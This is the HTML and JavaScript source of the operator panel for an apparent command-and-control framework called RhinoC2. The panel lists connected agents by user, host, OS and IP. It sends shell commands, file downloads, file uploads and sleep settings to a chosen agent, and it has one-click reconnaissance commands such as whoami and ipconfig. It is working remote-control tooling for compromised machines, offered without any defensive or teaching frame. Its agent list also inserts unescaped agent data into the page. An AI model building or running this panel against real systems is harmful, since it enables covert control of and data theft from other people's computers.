<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RhinoC2 Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #e0e0e0;
            line-height: 1.6;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background-color: #2c2c2c;
            padding: 20px;
            border-bottom: 2px solid #404040;
            margin-bottom: 20px;
        }

        h1 {
            color: #d4d4d4;
            font-size: 24px;
            font-weight: 500;
        }

        .status {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 12px;
            margin-left: 15px;
        }

        .status.connected {
            background-color: #2d5a2d;
            color: #90ee90;
        }

        .status.disconnected {
            background-color: #5a2d2d;
            color: #ff6b6b;
        }

        .main-content {
            display: grid;
            grid-template-columns: 350px 1fr;
            gap: 20px;
            height: calc(100vh - 120px);
        }

        .agents-panel {
            background-color: #252525;
            border: 1px solid #404040;
            border-radius: 4px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .panel-header {
            background-color: #2c2c2c;
            padding: 15px;
            border-bottom: 1px solid #404040;
        }

        .panel-header h2 {
            font-size: 16px;
            font-weight: 500;
            color: #d4d4d4;
        }

        .agents-list {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
        }

        .agent-item {
            background-color: #2c2c2c;
            padding: 12px;
            margin-bottom: 8px;
            border-radius: 4px;
            cursor: pointer;
            border: 1px solid #404040;
            transition: background-color 0.2s;
        }

        .agent-item:hover {
            background-color: #353535;
        }

        .agent-item.selected {
            background-color: #3a3a3a;
            border-color: #606060;
        }

        .agent-id {
            font-size: 13px;
            color: #b0b0b0;
            margin-bottom: 4px;
        }

        .agent-info {
            font-size: 12px;
            color: #909090;
        }

        .console-panel {
            background-color: #252525;
            border: 1px solid #404040;
            border-radius: 4px;
            display: flex;
            flex-direction: column;
        }

        .console-output {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            background-color: #1e1e1e;
        }

        .log-entry {
            margin-bottom: 8px;
            line-height: 1.5;
        }

        .log-entry.info {
            color: #4ec9b0;
        }

        .log-entry.success {
            color: #6a9955;
        }

        .log-entry.error {
            color: #f48771;
        }

        .log-entry.command {
            color: #dcdcaa;
        }

        .console-input {
            background-color: #2c2c2c;
            border-top: 1px solid #404040;
            padding: 15px;
        }

        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }

        input, select {
            background-color: #1e1e1e;
            border: 1px solid #404040;
            color: #d4d4d4;
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 13px;
        }

        input[type="text"] {
            flex: 1;
        }

        select {
            min-width: 150px;
        }

        button {
            background-color: #404040;
            color: #d4d4d4;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #505050;
        }

        button:active {
            background-color: #353535;
        }

        .quick-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .quick-actions button {
            background-color: #2c2c2c;
            font-size: 12px;
            padding: 6px 12px;
        }
    </style>
</head>
<body>
    <header>
        <h1>RhinoC2 Control Panel <span id="statusBadge" class="status disconnected">Disconnected</span></h1>
    </header>

    <div class="container">
        <div class="main-content">
            <div class="agents-panel">
                <div class="panel-header">
                    <h2>Active Agents (<span id="agentCount">0</span>)</h2>
                </div>
                <div class="agents-list" id="agentsList"></div>
            </div>

            <div class="console-panel">
                <div class="console-output" id="consoleOutput"></div>
                <div class="console-input">
                    <div class="input-group">
                        <select id="commandType">
                            <option value="shell">Shell Command</option>
                            <option value="download">Download File</option>
                            <option value="upload">Upload File</option>
                            <option value="sleep">Set Sleep Interval</option>
                        </select>
                        <input type="text" id="commandInput" placeholder="Enter command or path...">
                        <button onclick="executeCommand()">Execute</button>
                    </div>
                    <div class="quick-actions">
                        <button onclick="quickCommand('whoami')">whoami</button>
                        <button onclick="quickCommand('hostname')">hostname</button>
                        <button onclick="quickCommand('ipconfig')">ipconfig</button>
                        <button onclick="quickCommand('Get-Process')">processes</button>
                        <button onclick="quickCommand('pwd')">pwd</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let ws = null;
        let agents = {};
        let selectedAgent = null;

        function connect() {
            ws = new WebSocket('ws://' + window.location.host + '/api/operator');
            
            ws.onopen = () => {
                updateStatus(true);
                logMessage('Connected to RhinoC2 server', 'success');
            };

            ws.onclose = () => {
                updateStatus(false);
                logMessage('Disconnected from server', 'error');
                setTimeout(connect, 3000);
            };

            ws.onmessage = (event) => {
                const msg = JSON.parse(event.data);
                handleMessage(msg);
            };
        }

        function updateStatus(connected) {
            const badge = document.getElementById('statusBadge');
            badge.textContent = connected ? 'Connected' : 'Disconnected';
            badge.className = 'status ' + (connected ? 'connected' : 'disconnected');
        }

        function handleMessage(msg) {
            switch(msg.type) {
                case 'agent_list':
                    msg.data.forEach(agent => {
                        agents[agent.id] = agent;
                    });
                    updateAgentsList();
                    break;
                case 'agent_connected':
                    agents[msg.agent_id] = msg.data;
                    updateAgentsList();
                    logMessage(`Agent connected: ${msg.data.hostname} (${msg.agent_id})`, 'info');
                    break;
                case 'agent_disconnected':
                    const agent = agents[msg.agent_id];
                    if (agent) {
                        logMessage(`Agent disconnected: ${agent.hostname} (${msg.agent_id})`, 'error');
                        delete agents[msg.agent_id];
                    }
                    updateAgentsList();
                    break;
                case 'task_queued':
                    logMessage(`Task queued: ${msg.data.Command}`, 'info');
                    break;
                case 'task_result':
                    logMessage(`Result from ${msg.agent_id}:`, 'success');
                    logMessage(msg.data.Result, 'info');
                    break;
            }
        }

        function updateAgentsList() {
            const list = document.getElementById('agentsList');
            const count = document.getElementById('agentCount');
            
            list.innerHTML = '';
            count.textContent = Object.keys(agents).length;

            for (const id in agents) {
                const agent = agents[id];
                const div = document.createElement('div');
                div.className = 'agent-item' + (selectedAgent === id ? ' selected' : '');
                div.onclick = () => selectAgent(id);
                
                div.innerHTML = `
                    <div class="agent-id">${id.substring(0, 16)}...</div>
                    <div class="agent-info">${agent.username}@${agent.hostname}</div>
                    <div class="agent-info">${agent.os} - ${agent.ip}</div>
                `;
                
                list.appendChild(div);
            }
        }

        function selectAgent(id) {
            selectedAgent = id;
            updateAgentsList();
            logMessage(`Selected agent: ${agents[id].hostname}`, 'info');
        }

        function executeCommand() {
            if (!selectedAgent) {
                logMessage('No agent selected', 'error');
                return;
            }

            const cmdType = document.getElementById('commandType').value;
            const cmdInput = document.getElementById('commandInput').value;

            if (!cmdInput) {
                logMessage('Command input is empty', 'error');
                return;
            }

            const msg = {
                type: 'execute',
                data: {
                    agent_id: selectedAgent,
                    command: cmdType,
                    args: cmdInput
                }
            };

            ws.send(JSON.stringify(msg));
            logMessage(`Executing: ${cmdType} ${cmdInput}`, 'command');
            document.getElementById('commandInput').value = '';
        }

        function quickCommand(cmd) {
            if (!selectedAgent) {
                logMessage('No agent selected', 'error');
                return;
            }

            const msg = {
                type: 'execute',
                data: {
                    agent_id: selectedAgent,
                    command: 'shell',
                    args: cmd
                }
            };

            ws.send(JSON.stringify(msg));
            logMessage(`Executing: ${cmd}`, 'command');
        }

        function logMessage(text, type = 'info') {
            const output = document.getElementById('consoleOutput');
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + type;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            output.appendChild(entry);
            output.scrollTop = output.scrollHeight;
        }

        document.getElementById('commandInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });

        connect();
    </script>
</body>
</html>
